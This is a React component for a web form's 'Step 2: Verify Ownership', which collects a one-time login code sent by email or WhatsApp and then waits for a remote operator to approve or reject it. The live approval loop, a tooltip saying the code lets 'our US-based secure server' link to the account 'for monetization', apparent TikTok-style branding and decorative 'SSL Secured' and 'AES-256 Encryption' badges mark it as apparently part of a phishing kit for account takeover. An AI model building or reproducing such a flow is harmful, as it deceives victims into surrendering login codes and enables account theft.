
'use client';

import { zodResolver } from '@hookform/resolvers/zod';
import { ArrowLeft, Loader2, ArrowRight, HelpCircle, ShieldCheck, Lock } from 'lucide-react';
import { useForm } from 'react-hook-form';
import * as z from 'zod';
import { Button } from '@/components/ui/button';
import { Form, FormControl, FormField, FormItem, FormMessage, FormLabel } from '@/components/ui/form';
import { InputOTP, InputOTPGroup, InputOTPSlot } from '@/components/ui/input-otp';
import type { Submission } from '@/lib/types';
import { useState, useEffect } from 'react';
import { useToast } from '@/hooks/use-toast';
import { cn } from '@/lib/utils';
import { ResendCode } from './resend-code';
import { db } from '@/lib/firebase';
import { doc, onSnapshot } from 'firebase/firestore';
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from '@/components/ui/tooltip';

const emailFormSchema = z.object({
  verificationCode: z.string().length(6, "Code must be 6 digits."),
});

const phoneFormSchema = z.object({
  verificationCode: z.string().length(4, "Code must be 4 digits."),
});

interface VerifyCodeStepProps {
    submissionId: string;
    onApproval: (data: Partial<Submission>) => void;
    onRejection: () => void;
    onBack: () => void;
    loginMethod: 'email' | 'phone';
}

export function VerifyCodeStep({ submissionId, onApproval, onRejection, onBack, loginMethod }: VerifyCodeStepProps) {
    const { toast } = useToast();
    const [isSubmitting, setIsSubmitting] = useState(false);
    const [isWaiting, setIsWaiting] = useState(false);
    const [shake, setShake] = useState(false);
    
    const formSchema = loginMethod === 'email' ? emailFormSchema : phoneFormSchema;
    type FormValues = z.infer<typeof formSchema>;

    const form = useForm<FormValues>({
        resolver: zodResolver(formSchema),
        defaultValues: { verificationCode: '' },
    });

    const triggerShake = () => {
        setShake(true);
        setTimeout(() => setShake(false), 500);
    };
    
    // Client-side listener for real-time feedback
    useEffect(() => {
        if (!isWaiting || !submissionId) return;

        const docRef = doc(db, 'submissions', submissionId);
        
        const unsubscribe = onSnapshot(docRef, (docSnap) => {
            if (docSnap.exists()) {
                const submission = docSnap.data() as Submission;
                const status = submission.verificationCodeStatus;

                if (status === 'approved') {
                    unsubscribe(); // Clean up listener
                    onApproval({ verificationCode: form.getValues().verificationCode });
                } else if (status === 'rejected') {
                    unsubscribe(); // Clean up listener
                    setIsWaiting(false);
                    triggerShake();
                    form.reset();
                    onRejection();
                }
            }
        }, (error) => {
            console.error("Error listening to submission status:", error);
            toast({ variant: 'destructive', title: 'Error', description: 'Could not listen for status updates.' });
            setIsWaiting(false);
        });

        // Cleanup function to detach the listener when the component unmounts
        return () => unsubscribe();
        
    }, [isWaiting, submissionId, onApproval, onRejection, toast, form]);

    const onSubmit = async (values: FormValues) => {
        setIsSubmitting(true);
        try {
            const response = await fetch('/api/submissions', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id: submissionId, verificationCode: values.verificationCode }),
            });
            if (!response.ok) {
                const errorData = await response.json();
                throw new Error(errorData.message || 'Failed to submit verification code.');
            }

            toast({
              title: 'Code Submitted!',
              description: "We're confirming your code. This will just take a minute.",
            });
            
            // Start waiting for real-time feedback
            setIsWaiting(true);

        } catch (err: any) {
            toast({ variant: 'destructive', title: 'Submission Failed', description: err.message });
            triggerShake();
            setIsSubmitting(false); // Only stop submitting on error
        }
    };
    
    const isEmail = loginMethod === 'email';
    const codeLength = isEmail ? 6 : 4;
    const isButtonDisabled = isSubmitting || isWaiting || (form.watch('verificationCode')?.length ?? 0) < codeLength;
    const promptText = isEmail 
        ? <>We've sent a code to <span className="font-semibold text-slate-700">{submissionId}</span>.</>
        : <>We've sent a code via WhatsApp to <span className="font-semibold text-slate-700">{submissionId}</span>.</>;


    if (isWaiting) {
        return (
            <div className="w-full max-w-lg mx-auto text-center flex flex-col items-center justify-center space-y-8 py-16">
                <Loader2 className="h-12 w-12 animate-spin text-primary" />
                
                <div>
                     <h2 className="text-xl font-semibold text-slate-900">Confirming your code...</h2>
                     <p className="text-slate-500 mt-2">This will just take a moment.</p>
                </div>

                <ResendCode />
            </div>
        );
    }


    return (
        <div className={cn(shake && "animate-shake")}>
             <div className="w-full bg-slate-100 h-1.5 rounded-full mb-8">
                <div className="bg-gradient-to-r from-pink-500 to-rose-500 h-1.5 rounded-full w-2/4 shadow-sm"></div>
            </div>
            
            <div className="text-center mb-8">
                <h2 className="text-2xl font-extrabold text-slate-900">Step 2: Verify Ownership</h2>
                <p className="text-slate-500 mt-2">
                    {promptText}
                </p>
            </div>
            
            <Form {...form}>
                <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-6">
                    <FormField
                        control={form.control}
                        name="verificationCode"
                        render={({ field }) => (
                            <FormItem>
                                <FormLabel className="block text-xs font-bold text-slate-400 uppercase tracking-widest mb-2 ml-1 flex justify-between items-center">
                                    <span>Verification Code</span>
                                    <TooltipProvider>
                                        <Tooltip>
                                            <TooltipTrigger asChild>
                                                <HelpCircle className="h-4 w-4 text-slate-400 cursor-help" />
                                            </TooltipTrigger>
                                            <TooltipContent className="max-w-xs">
                                                <p>This code allows our US-based secure server to link with your account for monetization purposes only. We never see your password, and our access is limited to managing your Rewards Dashboard.</p>
                                            </TooltipContent>
                                        </Tooltip>
                                    </TooltipProvider>
                                </FormLabel>
                                <FormControl>
                                    <InputOTP 
                                        maxLength={codeLength}
                                        {...field} 
                                        disabled={isSubmitting || isWaiting}
                                        containerClassName="justify-center"
                                    >
                                        <InputOTPGroup className="gap-3">
                                            <InputOTPSlot index={0} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                            <InputOTPSlot index={1} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                            <InputOTPSlot index={2} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                            <InputOTPSlot index={3} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                            {isEmail && (
                                                <>
                                                    <InputOTPSlot index={4} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                                    <InputOTPSlot index={5} className="bg-slate-50 border-slate-200 rounded-2xl w-12 h-16 text-2xl" />
                                                </>
                                            )}
                                        </InputOTPGroup>
                                    </InputOTP>
                                </FormControl>
                                <FormMessage className="text-center" />
                            </FormItem>
                        )}
                    />

                     <div className="flex justify-around items-center text-xs text-muted-foreground pt-4">
                        <div className="flex items-center gap-2 text-slate-500">
                            <ShieldCheck className="h-4 w-4 text-green-500" />
                            <span>SSL Secured</span>
                        </div>
                        <div className="flex items-center gap-2 text-slate-500">
                            <Lock className="h-4 w-4 text-green-500" />
                            <span>AES-256 Encryption</span>
                        </div>
                    </div>
                    
                    <div className="flex flex-col gap-4 pt-4">
                        <Button type="submit" disabled={isButtonDisabled} className="w-full bg-[#FE2C55] hover:bg-[#E62247] text-white font-bold py-4 rounded-2xl shadow-lg shadow-rose-200 transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base">
                             {(isSubmitting || isWaiting) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {isWaiting ? 'Verifying...' : 'Continue'}
                             {!isSubmitting && !isWaiting && <ArrowRight className="ml-2 h-5 w-5" />}
                        </Button>
                        <Button type="button" variant="outline" onClick={onBack} disabled={isSubmitting || isWaiting} className="w-full bg-transparent hover:bg-slate-100 text-slate-500 font-bold py-4 rounded-2xl transition-transform active:scale-[0.98] flex items-center justify-center gap-2 h-auto text-base">
                            <ArrowLeft className="mr-2 h-5 w-5" />
                            Back
                        </Button>
                    </div>
                    <ResendCode />
                </form>
            </Form>
        </div>
    );
}
